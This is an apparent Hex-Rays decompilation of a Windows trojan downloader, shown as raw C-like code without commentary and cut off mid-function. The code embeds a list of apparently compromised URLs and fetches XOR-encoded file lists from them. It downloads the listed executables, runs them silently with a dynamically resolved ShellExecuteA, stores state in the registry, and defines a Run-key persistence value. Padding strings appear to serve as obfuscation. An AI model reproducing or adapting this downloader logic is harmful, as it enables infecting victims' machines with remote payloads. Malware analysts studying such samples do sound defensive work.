/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void __cdecl sub_401280(unsigned __int8 *Str2);
void __cdecl sub_401358(unsigned __int8 *Str2);
// int __usercall sub_40141C@<eax>(unsigned __int8 *@<edi>, CString *);
// int __usercall sub_4017D0@<eax>(int@<edi>, int);
void sub_40195C();
// int __usercall sub_401A64@<eax>(unsigned __int8 *@<edi>);
// int __usercall sub_401B70@<eax>(int@<edi>, struct CString *);
int sub_401FB0();
int sub_402164();
// int __usercall sub_4022F4@<eax>(unsigned __int8 *@<edi>);
void __noreturn sub_402BB8(); // weak
int __thiscall sub_402FBC(int *this, int a2, int a3, int a4);
int __thiscall sub_4030D0(void *); // idb
// int __userpurge sub_403114@<eax>(int *@<ecx>, DWORD@<esi>, int);
int sub_403184();
int sub_403188();
HWND __thiscall sub_4031C8(int *this);
unsigned int __cdecl sub_4032D0(void *); // idb
int sub_403314();
void __cdecl sub_40338C(); // idb
// void __usercall sub_403398(int@<edi>, int@<esi>);
void __cdecl sub_4033F0(); // idb
void __cdecl sub_4033FC(); // idb
void __cdecl sub_403408(); // idb
int (**sub_403414())();
int sub_40341C();
HKEY __thiscall sub_403424(HKEY *this);
// void __usercall sub_403440(int@<ecx>, int@<edi>, int@<esi>);
// void __usercall sub_4034C4(int@<ecx>, int@<edi>, int@<esi>);
// void __usercall sub_403520(void *@<ecx>, int@<edi>, int@<esi>);
// void __usercall sub_403584(void *@<ecx>, int@<edi>, int@<esi>);
// void __userpurge sub_4035E8(void *@<ecx>, int@<edi>, int@<esi>, char);
// CString *__thiscall CString::CString(CString *__hidden this, const struct CString *); idb
// void __thiscall CString::~CString(CString *__hidden this); idb
// void __thiscall CStringArray::SetAtGrow(CStringArray *__hidden this, int, const struct CString *); idb
// void __thiscall CStringArray::RemoveAt(CStringArray *__hidden this, int, int); idb
// CString *__thiscall CString::CString(CString *__hidden this, const char *); idb
// int __thiscall CString::Replace(CString *__hidden this, const char *, const char *); idb
// int __thiscall CString::ReverseFind(CString *__hidden this, char); idb
// CString *__thiscall CString::CString(CString *__hidden this); idb
// CInternetSession *__thiscall CInternetSession::CInternetSession(CInternetSession *__hidden this, const char *, unsigned int, unsigned int, const char *, const char *, unsigned int); idb
// struct CStdioFile *__thiscall CInternetSession::OpenURL(CInternetSession *__hidden this, const char *, unsigned int, unsigned int, const char *, unsigned int); idb
// void __thiscall CString::SetAt(CString *__hidden this, int, char); idb
// void __thiscall CInternetSession::Close(CInternetSession *__hidden this); idb
// void __thiscall CInternetSession::~CInternetSession(CInternetSession *__hidden this); idb
// int __thiscall CString::Find(CString *__hidden this, const char *); idb
// CStdioFile *__thiscall CStdioFile::CStdioFile(CStdioFile *__hidden this); idb
// int __thiscall CStdioFile::Open(CStdioFile *__hidden this, const char *, unsigned int, struct CFileException *); idb
// int __stdcall operator+(_DWORD, _DWORD, _DWORD); weak
// void __thiscall CStdioFile::WriteString(CStdioFile *__hidden this, const char *); idb
// void __thiscall CStdioFile::Close(CStdioFile *__hidden this); idb
// void __thiscall CStdioFile::~CStdioFile(CStdioFile *__hidden this); idb
// void __thiscall CStringArray::SetSize(CStringArray *__hidden this, int, int); idb
// CStdioFile *__thiscall CStdioFile::CStdioFile(CStdioFile *__hidden this, const char *, unsigned int); idb
// int __thiscall CStdioFile::ReadString(CStdioFile *__hidden this, struct CString *); idb
// int __thiscall CString::Delete(CString *__hidden this, int, int); idb
// int __thiscall CString::operator+=(_DWORD, _DWORD); weak
// int __thiscall CString::operator=(_DWORD, _DWORD); weak
// CFile *__thiscall CFile::CFile(CFile *__hidden this, const char *, unsigned int); idb
// void __thiscall CFile::Close(CFile *__hidden this); idb
// void __thiscall CFile::~CFile(CFile *__hidden this); idb
// void __thiscall CFile::Write(CFile *__hidden this, const void *, unsigned int); idb
// unsigned int __thiscall CFile::GetLength(CFile *__hidden this); idb
// void __thiscall CStringArray::SetAtGrow(CStringArray *__hidden this, int, const char *); idb
// int __thiscall CString::Left(_DWORD, _DWORD, _DWORD); weak
// int __stdcall AfxMessageBox(const char *, unsigned int, unsigned int); idb
// int __thiscall CString::operator=(_DWORD, _DWORD); weak
// int __thiscall CString::operator+=(_DWORD, _DWORD); weak
// struct AFX_MODULE_STATE *__stdcall AfxGetModuleState(); idb
// void __thiscall CString::MakeLower(CString *__hidden this); idb
// struct CWinThread *__stdcall AfxBeginThread(unsigned int (__cdecl *)(void *), void *, int, unsigned int, unsigned int, struct _SECURITY_ATTRIBUTES *); idb
// CStringArray *__thiscall CStringArray::CStringArray(CStringArray *__hidden this); idb
// void __thiscall CStringArray::~CStringArray(CStringArray *__hidden this); idb
// void __cdecl operator delete(void *); idb
// CWinApp *__thiscall CWinApp::CWinApp(CWinApp *__hidden this, const char *); idb
// void __thiscall CWinApp::~CWinApp(CWinApp *__hidden this); idb
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
// int __cdecl atexit(void (__cdecl *)());
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *)); idb
int __cdecl UserMathErrorFunction();
// int __stdcall AfxInitialize(int, unsigned int); idb
int sub_403C02();

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern DWORD (__stdcall *SleepEx)(DWORD dwMilliseconds, BOOL bAlertable);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern _UNKNOWN CWinApp::messageMap; weak
// extern int (__cdecl *mbscmp)(const unsigned __int8 *Str1, const unsigned __int8 *Str2);
// extern FILE *(__cdecl *fopen)(const char *FileName, const char *Mode);
// extern int (__cdecl *fclose)(FILE *Stream);
// extern int (__stdcall *GetWindowTextA)(HWND hWnd, LPSTR lpString, int nMaxCount);
// extern int (__stdcall *GetClassNameA)(HWND hWnd, LPSTR lpClassName, int nMaxCount);
// extern HWND (__stdcall *GetForegroundWindow)();
// extern DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern HWND (__stdcall *FindWindowExA)(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
int dword_403C1C = 0; // weak
char byte_403C38 = '\0'; // weak
int dword_403C40 = 0; // weak
int dword_403D20 = 0; // weak
int dword_403D24 = 0; // weak
_UNKNOWN FileName; // weak
int dword_403D40 = 0; // weak
int dword_403D44 = 0; // weak
int dword_403D48 = 0; // idb
_UNKNOWN unk_406000; // weak
_UNKNOWN unk_406120; // weak
_UNKNOWN unk_406240; // weak
int (*off_406464)() = &sub_40341C; // weak
struct CRuntimeClass *(__thiscall *off_406D40)(CWinApp *__hidden this) = &CWinApp::GetRuntimeClass; // weak
char Mode[2] = "r"; // idb
char aZLS[] = "[&&&z&&&l&&s]"; // idb
char asc_406E14[] = "&"; // idb
char byte_406E18[4] = { '\0', '\0', '\0', '\0' }; // idb
char aTXT[] = ".))))t))x)))t"; // idb
char asc_406E2C[] = ")"; // idb
char aSoftwareMicros[] = "software\\microsoft\\windows\\currentversion"; // idb
CHAR ValueName[] = "vvv"; // idb
char asc_406E60[2] = "\n"; // weak
CHAR LibFileName[] = "shell32"; // idb
CHAR ProcName[] = "ShellExecuteA"; // idb
char aOpen[5] = "open"; // weak
char aExe[] = ".exe"; // idb
char aHttpFlusentier[] = "http://flusentiere.de/images/counter/11.txt"; // idb
char aHttpWwwRenatek[] = "http://www.renatekoch.com/html/441.txt"; // idb
char aHttpWwwBerkili[] = "http://www.berkili-maschinen.de/img/log.txt"; // idb
char aHttpAdolfSeege[] = "http://adolf-seeger.de/rs/images/i.txt"; // idb
char aHttpThaibaaOrg[] = "http://thaibaa.org/files/i.txt"; // idb
char aHttpThaifisher[] = "http://thaifisherfolk.com/Doc/i.txt"; // idb
char aHttpAlsiroyalD[] = "http://alsiroyal.de/img/suche/i.txt"; // idb
char aHttpGanzheitli[] = "http://ganzheitliche-kurse.de/RUBRIKEN/i.txt"; // idb
char aHttp213819568I[] = "http://213.8.195.68/images/t.txt"; // idb
char aHttpFestivalga[] = "http://festivalgastronomico.com.br/images/0.txt"; // idb
char aCndrnndlkkffhq[] = " cndrnndlkkffhqjhscfrpjbokmjsne"; // idb
CHAR Caption[] = "this success."; // idb
char aJrpsoij[] = " jrpsoij"; // idb
CHAR Text[] = "Accomplishments are of "; // idb
char aEhofchl[] = " ehofchl"; // idb
CHAR aGreatestValueW[] = "greatest value when "; // idb
char aSkbdffspsn[] = " skbdffspsn"; // idb
CHAR aAdvancingOurPr[] = "advancing our progress"; // idb
char aMhcbsroldkkoek[] = " mhcbsroldkkoekpeefjrsrgbdcmq"; // idb
CHAR aTowardTheInsti[] = "toward the institutions "; // idb
char aNrildihdelffgr[] = " nrildihdelffgrbeooerrjmodis"; // idb
CHAR aGoalsFurther[] = "goals. Further, "; // idb
char aGqefjphcigodbj[] = " gqefjphcigodbjkgijeghddbsr"; // idb
CHAR aAccomplishment_0[] = "accomplishments are "; // idb
char aJoldkkels[] = " joldkkels"; // idb
CHAR aNot[] = "not"; // idb
char aKnsnhmnipsrjpp[] = " knsnhmnipsrjpprdlisf"; // idb
CHAR aSolelyTheResul[] = "solely the result of one "; // idb
char aRcpjkffqcegjhk[] = " rcpjkffqcegjhkomnegcsrg"; // idb
CHAR aPersonsEfforts[] = "persons efforts, but "; // idb
char aEjlhseeoipm[] = " ejlhseeoipm"; // idb
CHAR aRatherTheResul[] = "rather the result"; // idb
char aIklqelsefogimk[] = " iklqelsefogimkjqlbgfnp"; // idb
CHAR aOfSupportThatT[] = "of support that the "; // idb
char aIfnsrohfifi[] = " ifnsrohfifi"; // idb
CHAR aIndividualRece[] = "individual receives from "; // idb
char aFhrl[] = " fhrl"; // idb
CHAR aEtc[] = "etc. "; // idb
char aQdcionfmfikmeh[] = " qdcionfmfikmeh"; // idb
CHAR aAsSomeone[] = "As someone "; // idb
char asc_40728C[2] = "\\"; // weak
char aDriversC656Tx[16] = "drivers\\c656.tx"; // weak
BYTE Data[] = { 111u, 108u, 112u, 114u, 46u, 101u, 120u, 101u, 0u }; // idb
CHAR SubKey[] = "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"; // idb
CHAR aOlpr[] = "olpr"; // idb


//----- (00401280) --------------------------------------------------------
void __cdecl sub_401280(unsigned __int8 *Str2)
{
  int v1; // edx
  BOOL v2; // ebx
  int v3; // [esp+0h] [ebp-24h] BYREF
  int v4; // [esp+Ch] [ebp-18h]
  unsigned __int8 *Str1[2]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  Str1[1] = (unsigned __int8 *)&v3;
  v6 = 0;
  v1 = dword_403D48;
  v4 = 0;
  if ( dword_403D48 <= 0 )
  {
LABEL_6:
    CStringArray::SetAtGrow((CStringArray *)&dword_403D40, v1, (const struct CString *)&Str2);
    v6 = -1;
    CString::~CString((CString *)&Str2);
  }
  else
  {
    while ( 1 )
    {
      CString::CString((CString *)Str1, (const struct CString *)(dword_403D44 + 4 * v4));
      v6 = 1;
      v2 = mbscmp(Str1[0], Str2) == 0;
      v6 = 0;
      CString::~CString((CString *)Str1);
      if ( v2 )
        break;
      v1 = dword_403D48;
      if ( ++v4 >= dword_403D48 )
        goto LABEL_6;
    }
    v6 = -1;
    CString::~CString((CString *)&Str2);
  }
}
// 403D40: using guessed type int dword_403D40;
// 403D44: using guessed type int dword_403D44;

//----- (00401358) --------------------------------------------------------
void __cdecl sub_401358(unsigned __int8 *Str2)
{
  BOOL v1; // ebx
  int v2; // [esp+0h] [ebp-24h] BYREF
  int i; // [esp+Ch] [ebp-18h]
  unsigned __int8 *Str1[2]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  Str1[1] = (unsigned __int8 *)&v2;
  v5 = 0;
  for ( i = 0; i < dword_403D48; ++i )
  {
    CString::CString((CString *)Str1, (const struct CString *)(dword_403D44 + 4 * i));
    v5 = 1;
    v1 = mbscmp(Str1[0], Str2) == 0;
    v5 = 0;
    CString::~CString((CString *)Str1);
    if ( v1 )
      CStringArray::RemoveAt((CStringArray *)&dword_403D40, i, 1);
  }
  v5 = -1;
  CString::~CString((CString *)&Str2);
}
// 403D40: using guessed type int dword_403D40;
// 403D44: using guessed type int dword_403D44;

//----- (0040141C) --------------------------------------------------------
int __usercall sub_40141C@<eax>(unsigned __int8 *a1@<edi>, CString *a2)
{
  struct CStdioFile *v2; // eax
  int v3; // ebx
  unsigned __int8 *i; // edx
  int v5; // eax
  BOOL v6; // ebx
  unsigned __int8 *v8; // [esp-4h] [ebp-58h] BYREF
  int v9; // [esp+0h] [ebp-54h] BYREF
  char v10; // [esp+Ch] [ebp-48h]
  char v11; // [esp+10h] [ebp-44h]
  int v12; // [esp+14h] [ebp-40h]
  unsigned __int8 *Str2; // [esp+18h] [ebp-3Ch] BYREF
  char *v14; // [esp+1Ch] [ebp-38h] BYREF
  unsigned __int8 *Str1; // [esp+20h] [ebp-34h] BYREF
  char v16[20]; // [esp+24h] [ebp-30h] BYREF
  struct CStdioFile *v17; // [esp+38h] [ebp-1Ch]
  unsigned __int8 *v18[2]; // [esp+40h] [ebp-14h] BYREF
  int v19; // [esp+50h] [ebp-4h]

  v18[1] = (unsigned __int8 *)&v9;
  CString::CString((CString *)&Str2, aZLS);
  v19 = 0;
  CString::Replace((CString *)&Str2, asc_406E14, byte_406E18);
  CString::CString((CString *)&v14, aTXT);
  v19 = 1;
  CString::Replace((CString *)&v14, asc_406E2C, byte_406E18);
  if ( CString::ReverseFind(a2, 47) < 3 )
  {
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
    return 0;
  }
  CString::CString((CString *)&Str1);
  v19 = 2;
  CInternetSession::CInternetSession((CInternetSession *)v16, 0, 1u, 0, 0, 0, 0x84000000);
  v17 = 0;
  v19 = 4;
  v2 = CInternetSession::OpenURL((CInternetSession *)v16, *(const char **)a2, 1u, 1u, 0, 0);
  v17 = v2;
  if ( v2 )
  {
    v11 = 1;
    if ( (*(int (__thiscall **)(struct CStdioFile *, unsigned __int8 **))(*(_DWORD *)v2 + 96))(v2, &Str1) )
    {
      do
      {
        v3 = 0;
        for ( i = Str1; v3 < *((_DWORD *)Str1 - 2); i = Str1 )
        {
          CString::SetAt((CString *)&Str1, v3, i[v3] ^ 2);
          ++v3;
        }
        if ( v11 )
        {
          if ( mbscmp(i, Str2) )
          {
            (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v17 + 84))(v17);
            v17 = 0;
            CInternetSession::Close((CInternetSession *)v16);
            v19 = 2;
            CInternetSession::~CInternetSession((CInternetSession *)v16);
            v19 = 1;
            CString::~CString((CString *)&Str1);
            v19 = 0;
            CString::~CString((CString *)&v14);
            v19 = -1;
            CString::~CString((CString *)&Str2);
            return 0;
          }
          v11 = 0;
        }
        else
        {
          v8 = a1;
          CString::CString((CString *)&v8, (const struct CString *)&Str1);
          sub_401280(v8);
          v10 = 0;
          v5 = CString::Find((CString *)&Str1, v14);
          if ( v5 == *((_DWORD *)Str1 - 2) - 4 )
          {
            v12 = 0;
            if ( dword_403D48 > 0 )
            {
              while ( 1 )
              {
                CString::CString((CString *)v18, (const struct CString *)(dword_403D44 + 4 * v12));
                v19 = 5;
                v6 = mbscmp(v18[0], Str1) == 0;
                v19 = 4;
                CString::~CString((CString *)v18);
                if ( v6 )
                  break;
                if ( ++v12 >= dword_403D48 )
                  goto LABEL_17;
              }
              v10 = 1;
            }
LABEL_17:
            if ( !v10 )
              sub_40141C(a1, (CString *)&Str1);
          }
        }
      }
      while ( (*(int (__thiscall **)(struct CStdioFile *, unsigned __int8 **))(*(_DWORD *)v17 + 96))(v17, &Str1) );
    }
    (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v17 + 84))(v17);
    v17 = 0;
    v19 = 2;
    CInternetSession::~CInternetSession((CInternetSession *)v16);
    v19 = 1;
    CString::~CString((CString *)&Str1);
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
    return 1;
  }
  else
  {
    v19 = 2;
    CInternetSession::~CInternetSession((CInternetSession *)v16);
    v19 = 1;
    CString::~CString((CString *)&Str1);
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
    return 0;
  }
}
// 403D44: using guessed type int dword_403D44;

//----- (004017D0) --------------------------------------------------------
int __usercall sub_4017D0@<eax>(int a1@<edi>, int a2)
{
  HKEY v2; // eax
  int v3; // ebx
  HKEY v5; // eax
  int v6[4]; // [esp+0h] [ebp-44h] BYREF
  BYTE v7[4]; // [esp+10h] [ebp-34h] BYREF
  CHAR *v8; // [esp+14h] [ebp-30h]
  LPCSTR lpSubKey; // [esp+18h] [ebp-2Ch] BYREF
  HKEY hKey; // [esp+1Ch] [ebp-28h] BYREF
  HKEY phkResult; // [esp+20h] [ebp-24h] BYREF
  DWORD dwDisposition; // [esp+24h] [ebp-20h] BYREF
  DWORD Type; // [esp+28h] [ebp-1Ch] BYREF
  DWORD cbData; // [esp+2Ch] [ebp-18h] BYREF
  BYTE Data[4]; // [esp+30h] [ebp-14h] BYREF
  int *v16; // [esp+34h] [ebp-10h]
  int v17; // [esp+40h] [ebp-4h]

  v16 = v6;
  v6[0] = a1;
  CString::CString((CString *)&lpSubKey, aSoftwareMicros);
  hKey = 0;
  v17 = 1;
  phkResult = 0;
  if ( !RegCreateKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition) )
  {
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
    }
    hKey = phkResult;
  }
  if ( a2 )
  {
    v6[3] = (int)&hKey;
    *(_DWORD *)v7 = a2;
    v8 = ValueName;
    RegSetValueExA(hKey, ValueName, 0, 4u, v7, 4u);
    v5 = hKey;
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
      v5 = 0;
    }
    v17 = 0;
    if ( v5 )
    {
      RegCloseKey(v5);
      hKey = 0;
    }
    v17 = -1;
    CString::~CString((CString *)&lpSubKey);
    return 0;
  }
  else
  {
    cbData = 4;
    Type = 0;
    RegQueryValueExA(hKey, ValueName, 0, &Type, Data, &cbData);
    v2 = hKey;
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
      v2 = 0;
    }
    v3 = *(_DWORD *)Data;
    v17 = 0;
    if ( v2 )
    {
      RegCloseKey(v2);
      hKey = 0;
    }
    v17 = -1;
    CString::~CString((CString *)&lpSubKey);
    return v3;
  }
}

//----- (0040195C) --------------------------------------------------------
void sub_40195C()
{
  int v0; // [esp+0h] [ebp-3Ch] BYREF
  int i; // [esp+Ch] [ebp-30h]
  int v2[5]; // [esp+10h] [ebp-2Ch] BYREF
  char v3[4]; // [esp+24h] [ebp-18h] BYREF
  char *v4[2]; // [esp+28h] [ebp-14h] BYREF
  int v5; // [esp+38h] [ebp-4h]

  v4[1] = (char *)&v0;
  CStdioFile::CStdioFile((CStdioFile *)v2);
  v5 = 0;
  if ( CStdioFile::Open((CStdioFile *)v2, FileName, 0x1021u, 0) )
  {
    (*(void (__thiscall **)(int *, _DWORD, int))(v2[0] + 48))(v2, 0, 2);
    for ( i = 0; i < dword_403D48; ++i )
    {
      CString::CString((CString *)v3, (const struct CString *)(dword_403D44 + 4 * i));
      v5 = 1;
      operator+(v4, v3, asc_406E60);
      v5 = 2;
      CStdioFile::WriteString((CStdioFile *)v2, v4[0]);
      v5 = 1;
      CString::~CString((CString *)v4);
      v5 = 0;
      CString::~CString((CString *)v3);
    }
  }
  CStdioFile::Close((CStdioFile *)v2);
  v5 = -1;
  CStdioFile::~CStdioFile((CStdioFile *)v2);
}
// 4036AC: using guessed type int __stdcall operator+(_DWORD, _DWORD, _DWORD);
// 403D44: using guessed type int dword_403D44;
// 40195C: using guessed type char var_18[4];

//----- (00401A64) --------------------------------------------------------
int __usercall sub_401A64@<eax>(unsigned __int8 *a1@<edi>)
{
  FILE *v1; // eax
  unsigned __int8 *v3; // [esp-4h] [ebp-3Ch] BYREF
  int v4; // [esp+0h] [ebp-38h] BYREF
  char v5[20]; // [esp+Ch] [ebp-2Ch] BYREF
  int v6[3]; // [esp+20h] [ebp-18h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  v6[2] = (int)&v4;
  v1 = fopen(FileName, Mode);
  if ( !v1 )
    return 0;
  fclose(v1);
  CStringArray::SetSize((CStringArray *)&dword_403D40, 0, -1);
  CStdioFile::CStdioFile((CStdioFile *)v5, FileName, 0x20u);
  v7 = 0;
  CString::CString((CString *)v6);
  v7 = 1;
  while ( CStdioFile::ReadString((CStdioFile *)v5, (struct CString *)v6) )
  {
    if ( *(int *)(v6[0] - 8) > 6 )
    {
      v3 = a1;
      CString::CString((CString *)&v3, (const struct CString *)v6);
      sub_401280(v3);
    }
  }
  CStdioFile::Close((CStdioFile *)v5);
  v7 = 0;
  CString::~CString((CString *)v6);
  v7 = -1;
  CStdioFile::~CStdioFile((CStdioFile *)v5);
  return 1;
}
// 403D40: using guessed type int dword_403D40;

//----- (00401B70) --------------------------------------------------------
int __usercall sub_401B70@<eax>(int a1@<edi>, struct CString *a2)
{
  void *v2; // esp
  int v4; // ebx
  unsigned int i; // eax
  int Length; // esi
  bool v7; // bl
  HINSTANCE (__stdcall *ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT); // eax
  HMODULE LibraryA; // eax
  char v10[20]; // [esp+0h] [ebp-8150h] BYREF
  const CHAR *v11; // [esp+14h] [ebp-813Ch] BYREF
  LPCSTR lpFileName; // [esp+18h] [ebp-8138h] BYREF
  struct CStdioFile *v13; // [esp+1Ch] [ebp-8134h]
  char v14[16]; // [esp+20h] [ebp-8130h] BYREF
  char v15[33024]; // [esp+30h] [ebp-8120h] BYREF
  int v16; // [esp+8130h] [ebp-20h]
  int v17; // [esp+813Ch] [ebp-14h]
  char *v18; // [esp+8140h] [ebp-10h]
  int v19; // [esp+814Ch] [ebp-4h]

  v2 = alloca(33092);
  v18 = v10;
  v16 = a1;
  v17 = CString::ReverseFind(a2, 47);
  if ( v17 < 3 )
    return 0;
  CInternetSession::CInternetSession((CInternetSession *)v10, 0, 1u, 0, 0, 0, 0x84000000);
  v19 = 0;
  CString::CString((CString *)&v11, (const struct CString *)&dword_403D24);
  v19 = 1;
  CString::CString((CString *)&lpFileName, a2);
  v19 = 2;
  CString::Delete((CString *)&lpFileName, 0, v17 + 1);
  CString::operator+=(&v11, &lpFileName);
  CString::operator=(&lpFileName, &v11);
  v13 = 0;
  v19 = 3;
  v13 = CInternetSession::OpenURL((CInternetSession *)v10, *(const char **)a2, 1u, 1u, 0, 0);
  if ( !v13 )
    goto LABEL_16;
  CFile::CFile((CFile *)v14, lpFileName, 0x1022u);
  v19 = 4;
  v4 = (*(int (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 56))(v13);
  if ( v4 != sub_4017D0(a1, 0) )
  {
    for ( i = (*(int (__thiscall **)(struct CStdioFile *, char *, int))(*(_DWORD *)v13 + 60))(v13, v15, 0x8000);
          i;
          i = (*(int (__thiscall **)(struct CStdioFile *, char *, int))(*(_DWORD *)v13 + 60))(v13, v15, 0x8000) )
    {
      CFile::Write((CFile *)v14, v15, i);
    }
    Length = CFile::GetLength((CFile *)v14);
    v7 = CFile::GetLength((CFile *)v14) > 0x400;
    CFile::Close((CFile *)v14);
    (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 84))(v13);
    v13 = 0;
    CInternetSession::Close((CInternetSession *)v10);
    if ( v7 )
    {
      ShellExecuteA = (HINSTANCE (__stdcall *)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT))dword_403C1C;
      if ( !dword_403C1C )
      {
        LibraryA = LoadLibraryA(LibFileName);
        ShellExecuteA = (HINSTANCE (__stdcall *)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT))GetProcAddress(
                                                                                              LibraryA,
                                                                                              ProcName);
        dword_403C1C = (int)ShellExecuteA;
      }
      if ( (int)ShellExecuteA(0, aOpen, lpFileName, byte_406E18, v11, 10) > 32 )
      {
        sub_4017D0(a1, Length);
        v19 = 3;
        CFile::~CFile((CFile *)v14);
        v19 = 1;
        CString::~CString((CString *)&lpFileName);
        v19 = 0;
        CString::~CString((CString *)&v11);
        v19 = -1;
        CInternetSession::~CInternetSession((CInternetSession *)v10);
        return 1;
      }
      v19 = 3;
      CFile::~CFile((CFile *)v14);
      v19 = 1;
      CString::~CString((CString *)&lpFileName);
      v19 = 0;
      CString::~CString((CString *)&v11);
      v19 = -1;
      CInternetSession::~CInternetSession((CInternetSession *)v10);
      return 0;
    }
    v19 = 3;
    CFile::~CFile((CFile *)v14);
LABEL_16:
    v19 = 1;
    CString::~CString((CString *)&lpFileName);
    v19 = 0;
    CString::~CString((CString *)&v11);
    v19 = -1;
    CInternetSession::~CInternetSession((CInternetSession *)v10);
    return 0;
  }
  CFile::Close((CFile *)v14);
  (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 84))(v13);
  v13 = 0;
  CInternetSession::Close((CInternetSession *)v10);
  DeleteFileA(lpFileName);
  v19 = 3;
  CFile::~CFile((CFile *)v14);
  v19 = 1;
  CString::~CString((CString *)&lpFileName);
  v19 = 0;
  CString::~CString((CString *)&v11);
  v19 = -1;
  CInternetSession::~CInternetSession((CInternetSession *)v10);
  return 1;
}
// 4036DC: using guessed type int __thiscall CString::operator+=(_DWORD, _DWORD);
// 4036E2: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 403C1C: using guessed type int dword_403C1C;
// 403D24: using guessed type int dword_403D24;

//----- (00401FB0) --------------------------------------------------------
int sub_401FB0()
{
  const struct CString *v0; // edi
  bool v1; // bl
  int v2; // ebx
  unsigned __int8 *v4; // [esp-4h] [ebp-4Ch] BYREF
  int v5; // [esp+0h] [ebp-48h] BYREF
  int v6; // [esp+Ch] [ebp-3Ch]
  int v7; // [esp+10h] [ebp-38h]
  int v8; // [esp+14h] [ebp-34h]
  int i; // [esp+18h] [ebp-30h]
  int v10; // [esp+1Ch] [ebp-2Ch]
  int v11; // [esp+20h] [ebp-28h]
  int v12; // [esp+24h] [ebp-24h] BYREF
  char v13[4]; // [esp+28h] [ebp-20h] BYREF
  int v14; // [esp+2Ch] [ebp-1Ch] BYREF
  char v15[8]; // [esp+30h] [ebp-18h] BYREF
  int *v16; // [esp+38h] [ebp-10h]
  int v17; // [esp+44h] [ebp-4h]

  v16 = &v5;
  v6 = 0;
  for ( i = 0; i < dword_403D48; ++i )
  {
    v0 = (const struct CString *)(dword_403D44 + 4 * i);
    v10 = 0;
    v11 = 0;
    v8 = 2 * i;
    CString::CString((CString *)&v12, v0);
    v17 = 0;
    if ( *(int *)(v12 - 8) <= 7 )
    {
      v1 = 0;
    }
    else
    {
      CString::CString((CString *)v13, (const struct CString *)(dword_403D44 + 2 * v8));
      v11 = 1;
      v17 = 1;
      v7 = CString::Find((CString *)v13, aExe);
      CString::CString((CString *)&v14, (const struct CString *)(dword_403D44 + 2 * v8));
      v10 = 1;
      v17 = 2;
      v1 = v7 == *(_DWORD *)(v14 - 8) - 4;
    }
    v17 = -1;
    if ( v10 )
      CString::~CString((CString *)&v14);
    v17 = 0;
    if ( v11 )
      CString::~CString((CString *)v13);
    v17 = -1;
    CString::~CString((CString *)&v12);
    if ( v1 )
    {
      CString::CString((CString *)v15, (const struct CString *)(dword_403D44 + 2 * v8));
      v17 = 3;
      v2 = sub_401B70((int)v0, (struct CString *)v15);
      v17 = -1;
      CString::~CString((CString *)v15);
      if ( v2 )
      {
        v6 = 1;
        break;
      }
      v4 = (unsigned __int8 *)v0;
      CString::CString((CString *)&v4, (const struct CString *)(dword_403D44 + 2 * v8));
      sub_401358(v4);
      --i;
    }
  }
  sub_40195C();
  return v6;
}
// 403D44: using guessed type int dword_403D44;
// 401FB0: using guessed type char var_20[4];

//----- (00402164) --------------------------------------------------------
int sub_402164()
{
